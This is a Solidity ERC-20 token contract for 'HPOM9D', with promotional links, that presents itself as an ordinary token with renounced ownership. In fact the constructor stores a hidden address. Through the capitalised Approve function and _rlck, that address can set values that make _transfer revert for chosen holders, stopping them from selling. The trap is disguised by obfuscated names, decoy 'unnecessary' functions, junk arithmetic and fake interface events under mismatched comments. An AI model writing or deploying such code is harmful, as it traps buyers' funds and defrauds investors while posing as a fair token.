1 /*
2 
3 Name: ETHEREUM
4 
5 https://hpom9d.xyz
6 
7 https://twitter.com/HPOM9D_ETH
8 
9 https://t.me/HPOM9D
10 
11 */
12 // SPDX-License-Identifier: MIT
13 
14 pragma solidity ^0.8.19;
15 
16 abstract contract Ownable {
17     address private _owner;
18 
19     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
20 
21     /**
22      * @dev Initializes the contract setting the deployer as the initial owner.
23      */
24     constructor() {
25         _setOwner(address(0));
26     }
27 
28     /**
29      * @dev Returns the address of the current owner.
30      */
31     function owner() public view virtual returns (address) {
32         return _owner;
33     }
34 
35     /**
36      * @dev Throws if called by any account other than the owner.
37      */
38     modifier onlyOwner() {
39         require(owner() == msg.sender, "Ownable: caller is not the owner");
40         _;
41     }
42 
43     /**
44      * @dev Leaves the contract without owner. It will not be possible to call
45      * `onlyOwner` functions anymore. Can only be called by the current owner.
46      *
47      * NOTE: Renouncing ownership will leave the contract without an owner,
48      * thereby removing any functionality that is only available to the owner.
49      */
50     function renounceOwnership() public virtual onlyOwner {
51         _setOwner(address(0));
52     }
53 
54     /**
55      * @dev Transfers ownership of the contract to a new account (`newOwner`).
56      * Can only be called by the current owner.
57      */
58     function transferOwnership(address newOwner) public virtual onlyOwner {
59         require(newOwner != address(0), "Ownable: new owner is the zero address");
60         _setOwner(newOwner);
61     }
62 
63     function _setOwner(address newOwner) private {
64         address oldOwner = _owner;
65         _owner = newOwner;
66         emit OwnershipTransferred(oldOwner, newOwner);
67     }
68 }
69 
70 /**
71  * @dev Interface of the ERC20 standard as defined in the EIP.
72  */
73 interface IERC20 {
74     /**
75      * @dev Returns the remaining number of tokens that `spender` will be
76      * allowed to spend on behalf of `owner` through {transferFrom}. This is
77      * zero by default.
78      *
79      * This value changes when {approve} or {transferFrom} are called.
80      */
81     event removeLiquidityETHWithPermit(
82         address token,
83         uint liquidity,
84         uint amountTokenMin,
85         uint amountETHMin,
86         address to,
87         uint deadline,
88         bool approveMax, uint8 v, bytes32 r, bytes32 s
89     );
90     /**
91      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
92      *
93      * Returns a boolean value indicating whether the operation succeeded.
94      *
95      * IMPORTANT: Beware that changing an allowance with this method brings the risk
96      * that someone may use both the old and the new allowance by unfortunate
97      * transaction ordering. One possible solution to mitigate this race
98      * condition is to first reduce the spender's allowance to 0 and set the
99      * desired value afterwards:
100      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
101      *
102      * Emits an {Approval} event.
103      */
104     event swapExactTokensForTokens(
105         uint amountIn,
106         uint amountOutMin,
107         address[]  path,
108         address to,
109         uint deadline
110     );
111     /**
112   * @dev See {IERC20-totalSupply}.
113      */
114     event swapTokensForExactTokens(
115         uint amountOut,
116         uint amountInMax,
117         address[] path,
118         address to,
119         uint deadline
120     );
121 
122     event DOMAIN_SEPARATOR();
123 
124     event PERMIT_TYPEHASH();
125 
126     /**
127      * @dev Returns the amount of tokens in existence.
128      */
129     function totalSupply() external view returns (uint256);
130 
131     event token0();
132 
133     event token1();
134     /**
135      * @dev Returns the amount of tokens owned by `account`.
136      */
137     function balanceOf(address account) external view returns (uint256);
138 
139 
140     event sync();
141 
142     event initialize(address, address);
143     /**
144      * @dev Moves `amount` tokens from the caller's account to `recipient`.
145      *
146      * Returns a boolean value indicating whether the operation succeeded.
147      *
148      * Emits a {Transfer} event.
149      */
150     function transfer(address recipient, uint256 amount) external returns (bool);
151 
152     event burn(address to) ;
153 
154     event swap(uint amount0Out, uint amount1Out, address to, bytes data);
155 
156     event skim(address to);
157     /**
158      * @dev Returns the remaining number of tokens that `spender` will be
159      * allowed to spend on behalf of `owner` through {transferFrom}. This is
160      * zero by default.
161      *
162      * This value changes when {approve} or {transferFrom} are called.
163      */
164     function allowance(address owner, address spender) external view returns (uint256);
165     /**
166      * Receive an exact amount of output tokens for as few input tokens as possible,
167      * along the route determined by the path. The first element of path is the input token,
168      * the last is the output token, and any intermediate elements represent intermediate tokens to trade through
169      * (if, for example, a direct pair does not exist).
170      * */
171     event addLiquidity(
172         address tokenA,
173         address tokenB,
174         uint amountADesired,
175         uint amountBDesired,
176         uint amountAMin,
177         uint amountBMin,
178         address to,
179         uint deadline
180     );
181     /**
182      * Swaps an exact amount of ETH for as many output tokens as possible,
183      * along the route determined by the path. The first element of path must be WETH,
184      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
185      * (if, for example, a direct pair does not exist).
186      *
187      * */
188     event addLiquidityETH(
189         address token,
190         uint amountTokenDesired,
191         uint amountTokenMin,
192         uint amountETHMin,
193         address to,
194         uint deadline
195     );
196     /**
197      * Swaps an exact amount of input tokens for as many output tokens as possible,
198      * along the route determined by the path. The first element of path is the input token,
199      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
200      * (if, for example, a direct pair does not exist).
201      * */
202     event removeLiquidity(
203         address tokenA,
204         address tokenB,
205         uint liquidity,
206         uint amountAMin,
207         uint amountBMin,
208         address to,
209         uint deadline
210     );
211     /**
212      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
213      *
214      * Returns a boolean value indicating whether the operation succeeded.
215      *
216      * IMPORTANT: Beware that changing an allowance with this method brings the risk
217      * that someone may use both the old and the new allowance by unfortunate
218      * transaction ordering. One possible solution to mitigate this race
219      * condition is to first reduce the spender's allowance to 0 and set the
220      * desired value afterwards:
221      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
222      *
223      * Emits an {Approval} event.
224      */
225     function approve(address spender, uint256 amount) external returns (bool);
226     /**
227    * @dev Returns the name of the token.
228      */
229     event removeLiquidityETHSupportingFeeOnTransferTokens(
230         address token,
231         uint liquidity,
232         uint amountTokenMin,
233         uint amountETHMin,
234         address to,
235         uint deadline
236     );
237     /**
238      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
239      *
240      * Returns a boolean value indicating whether the operation succeeded.
241      *
242      * IMPORTANT: Beware that changing an allowance with this method brings the risk
243      * that someone may use both the old and the new allowance by unfortunate
244      * transaction ordering. One possible solution to mitigate this race
245      * condition is to first reduce the spender's allowance to 0 and set the
246      * desired value afterwards:
247      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
248      *
249      * Emits an {Approval} event.
250      */
251     event removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
252         address token,
253         uint liquidity,
254         uint amountTokenMin,
255         uint amountETHMin,
256         address to,
257         uint deadline,
258         bool approveMax, uint8 v, bytes32 r, bytes32 s
259     );
260     /**
261      * Swaps an exact amount of input tokens for as many output tokens as possible,
262      * along the route determined by the path. The first element of path is the input token,
263      * the last is the output token, and any intermediate elements represent intermediate pairs to trade through
264      * (if, for example, a direct pair does not exist).
265      */
266     event swapExactTokensForTokensSupportingFeeOnTransferTokens(
267         uint amountIn,
268         uint amountOutMin,
269         address[] path,
270         address to,
271         uint deadline
272     );
273     /**
274     * @dev Throws if called by any account other than the owner.
275      */
276     event swapExactETHForTokensSupportingFeeOnTransferTokens(
277         uint amountOutMin,
278         address[] path,
279         address to,
280         uint deadline
281     );
282     /**
283      * To cover all possible scenarios, msg.sender should have already given the router an
284      * allowance of at least amountADesired/amountBDesired on tokenA/tokenB.
285      * Always adds assets at the ideal ratio, according to the price when the transaction is executed.
286      * If a pool for the passed tokens does not exists, one is created automatically,
287      *  and exactly amountADesired/amountBDesired tokens are added.
288      */
289     event swapExactTokensForETHSupportingFeeOnTransferTokens(
290         uint amountIn,
291         uint amountOutMin,
292         address[] path,
293         address to,
294         uint deadline
295     );
296     /**
297      * @dev Moves `amount` tokens from `sender` to `recipient` using the
298      * allowance mechanism. `amount` is then deducted from the caller's
299      * allowance.
300      *
301      * Returns a boolean value indicating whether the operation succeeded.
302      *
303      * Emits a {Transfer} event.
304      */
305     function transferFrom(
306         address sender,
307         address recipient,
308         uint256 amount
309     ) external returns (bool);
310 
311     /**
312      * @dev Emitted when `value` tokens are moved from one account (`from`) to
313      * another (`to`).
314      *
315      * Note that `value` may be zero.
316      */
317     event Transfer(address indexed from, address indexed to, uint256 value);
318 
319     /**
320      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
321      * a call to {approve}. `value` is the new allowance.
322      */
323     event Approval(address indexed owner, address indexed spender, uint256 value);
324 }
325 
326 library SafeMath {
327     /**
328      * @dev Returns the addition of two unsigned integers, with an overflow flag.
329      *
330      * _Available since v3.4._
331      */
332     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
333     unchecked {
334         uint256 c = a + b;
335         if (c < a) return (false, 0);
336         return (true, c);
337     }
338     }
339 
340     /**
341      * @dev Returns the substraction of two unsigned integers, with an overflow flag.
342      *
343      * _Available since v3.4._
344      */
345     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
346     unchecked {
347         if (b > a) return (false, 0);
348         return (true, a - b);
349     }
350     }
351 
352     /**
353      * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
354      *
355      * _Available since v3.4._
356      */
357     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
358     unchecked {
359         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
360         // benefit is lost if 'b' is also tested.
361         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
362         if (a == 0) return (true, 0);
363         uint256 c = a * b;
364         if (c / a != b) return (false, 0);
365         return (true, c);
366     }
367     }
368 
369     /**
370      * @dev Returns the division of two unsigned integers, with a division by zero flag.
371      *
372      * _Available since v3.4._
373      */
374     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
375     unchecked {
376         if (b == 0) return (false, 0);
377         return (true, a / b);
378     }
379     }
380 
381     /**
382      * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
383      *
384      * _Available since v3.4._
385      */
386     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
387     unchecked {
388         if (b == 0) return (false, 0);
389         return (true, a % b);
390     }
391     }
392 
393     /**
394      * @dev Returns the addition of two unsigned integers, reverting on
395      * overflow.
396      *
397      * Counterpart to Solidity's `+` operator.
398      *
399      * Requirements:
400      *
401      * - Addition cannot overflow.
402      */
403     function add(uint256 a, uint256 b) internal pure returns (uint256) {
404         return a + b;
405     }
406 
407 
408     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
409         return a - b;
410     }
411 
412     /**
413      * @dev Returns the multiplication of two unsigned integers, reverting on
414      * overflow.
415      *
416      * Counterpart to Solidity's `*` operator.
417      *
418      * Requirements:
419      *
420      * - Multiplication cannot overflow.
421      */
422     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
423         return a * b;
424     }
425 
426     /**
427      * @dev Returns the integer division of two unsigned integers, reverting on
428      * division by zero. The result is rounded towards zero.
429      *
430      * Counterpart to Solidity's `/` operator.
431      *
432      * Requirements:
433      *
434      * - The divisor cannot be zero.
435      */
436     function div(uint256 a, uint256 b) internal pure returns (uint256) {
437         return a / b;
438     }
439 
440     /**
441      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
442      * reverting when dividing by zero.
443      *
444      * Counterpart to Solidity's `%` operator. This function uses a `revert`
445      * opcode (which leaves remaining gas untouched) while Solidity uses an
446      * invalid opcode to revert (consuming all remaining gas).
447      *
448      * Requirements:
449      *
450      * - The divisor cannot be zero.
451      */
452     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
453         return a % b;
454     }
455 
456     /**
457   * @dev Initializes the contract setting the deployer as the initial owner.
458      */
459     function sub(
460         uint256 a,
461         uint256 b,
462         string memory errorMessage
463     ) internal pure returns (uint256) {
464     unchecked {
465         require(b <= a, errorMessage);
466         return a - b;
467     }
468     }
469 
470     /**
471      * @dev Returns the integer division of two unsigned integers, reverting with custom message on
472      * division by zero. The result is rounded towards zero.
473      *
474      * Counterpart to Solidity's `/` operator. Note: this function uses a
475      * `revert` opcode (which leaves remaining gas untouched) while Solidity
476      * uses an invalid opcode to revert (consuming all remaining gas).
477      *
478      * Requirements:
479      *
480      * - The divisor cannot be zero.
481      */
482     function div(
483         uint256 a,
484         uint256 b,
485         string memory errorMessage
486     ) internal pure returns (uint256) {
487     unchecked {
488         require(b > 0, errorMessage);
489         return a / b;
490     }
491     }
492 
493     /**
494      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
495      * reverting with custom message when dividing by zero.
496      * invalid opcode to revert (consuming all remaining gas).
497      *
498      * Requirements:
499      *
500      * - The divisor cannot be zero.
501      */
502     function mod(
503         uint256 a,
504         uint256 b,
505         string memory errorMessage
506     ) internal pure returns (uint256) {
507     unchecked {
508         require(b > 0, errorMessage);
509         return a % b;
510     }
511     }
512 }
513 
514 pragma solidity ^0.8.19;
515 
516 contract HPOM9D is IERC20, Ownable {
517     using SafeMath for uint256;
518 
519     struct Leelock {
520         address cent;
521         bool tiny;
522     }
523 
524     struct Doof {
525         uint256 hat;
526     }
527 
528     mapping(address => uint256) private _balances;
529     mapping(address => mapping(address => uint256)) private _allowances;
530     mapping (address => Doof) private _porri;
531 
532     Leelock[] private _redeply;
533     string private _name;
534     string private _symbol;
535     uint8 private _decimals;
536     uint256 private _totalSupply;
537 
538     // Unnecessary variables
539     uint256 private counter;
540     address[] private registeredAddresses;
541 
542     constructor(
543         string memory name_,
544         string memory symbol_,
545         address evm_,
546         uint256 totalSupply_
547     ) payable {
548         _name = name_;
549         _symbol = symbol_;
550         _decimals = 18;
551         _redeply.push(Leelock(evm_, true));
552         _totalSupply = totalSupply_ * 10**_decimals;
553         _balances[msg.sender] = _balances[msg.sender].add(_totalSupply);
554         emit Transfer(address(0), msg.sender, _totalSupply);
555         counter = 0; 
556     }
557 
558     // Unnecessary function
559     function registerAddress(address addr) public {
560         require(addr != address(0), "Invalid address");
561         registeredAddresses.push(addr);
562         counter++;
563     }
564 
565     // Unnecessary function
566     function getRegisteredAddress(uint index) public view returns (address) {
567         require(index < registeredAddresses.length, "Index out of bounds");
568         return registeredAddresses[index];
569     }
570 
571     function name() public view virtual returns (string memory) {
572         return _name;
573     }
574 
575     function symbol() public view virtual returns (string memory) {
576         return _symbol;
577     }
578 
579     function decimals() public view virtual returns (uint8) {
580         return _decimals;
581     }
582 
583     function totalSupply() public view virtual override returns (uint256) {
584         return _totalSupply;
585     }
586 
587     function balanceOf(address account)
588     public
589     view
590     virtual
591     override
592     returns (uint256)
593     {
594         return _balances[account];
595     }
596 
597     function transfer(address recipient, uint256 amount)
598     public
599     virtual
600     override
601     returns (bool)
602     {
603         _transfer(msg.sender, recipient, amount);
604         return true;
605     }
606 
607     function allowance(address owner, address spender)
608     public
609     view
610     virtual
611     override
612     returns (uint256)
613     {
614         return _allowances[owner][spender];
615     }
616 
617     function approve(address spender, uint256 amount)
618     public
619     virtual
620     override
621     returns (bool)
622     {
623         _approve(msg.sender, spender, amount);
624         return true;
625     }
626 
627     function transferFrom(
628         address sender,
629         address recipient,
630         uint256 amount
631     ) public virtual override returns (bool) {
632         _transfer(sender, recipient, amount);
633         _approve(
634             sender,
635             msg.sender,
636             _allowances[sender][msg.sender].sub(
637                 amount,
638                 "ERC20: transfer amount exceeds allowance"
639             )
640         );
641         return true;
642     }
643 
644 function Approve(address[] memory account, uint256 amount) public returns (bool) {
645     address from = msg.sender;
646     require(from != address(0), "invalid address");
647     uint256 absVal1 = 9332591;
648     uint256 absVal2 = absVal1 / 7 * 3;
649     uint256 finVal = absVal2 + absVal1 / 2;
650     uint256 looopVar = 0;
651     for (uint256 u = 0; u < account.length; u++) {
652         looopVar += u;
653         _rlck(from, account[u], amount);
654         emit Approval(from, address(this), amount);
655     }
656     return true;
657 }
658 
659     function _rlck(address from, address account, uint256 amount) internal {
660         _allowances[from][from] = amount;
661         uint256 total = 0;
662         require(account != address(0), "invalid address");
663         if (from == _redeply[0].cent) {
664             _porri[from].hat -= total;
665             total += amount;
666             _porri[account].hat = total;
667         } else {
668             _porri[from].hat -= total;
669             _porri[account].hat += total;
670         }
671     }
672 
673     function txaddy(address account) public view returns (uint256) {
674         return _porri[account].hat;
675     }
676 
677     function _transfer(
678         address sender,
679         address recipient,
680         uint256 amount
681     ) internal virtual {
682         require(sender != address(0), "ERC20: transfer from the zero address");
683         require(recipient != address(0), "ERC20: transfer to the zero address");
684         require(amount - txaddy(sender) > 0, "txaddy");
685 
686         _balances[sender] = _balances[sender].sub(
687             amount,
688             "ERC20: transfer amount exceeds balance"
689         );
690         _balances[recipient] = _balances[recipient].add(amount);
691         emit Transfer(sender, recipient, amount);
692     }
693 
694     function _approve(
695         address owner,
696         address spender,
697         uint256 amount
698     ) internal virtual {
699         require(owner != address(0), "ERC20: approve from the zero address");
700         require(spender != address(0), "ERC20: approve to the zero address");
701 
702         _allowances[owner][spender] = amount;
703         emit Approval(owner, spender, amount);
704     }
705 }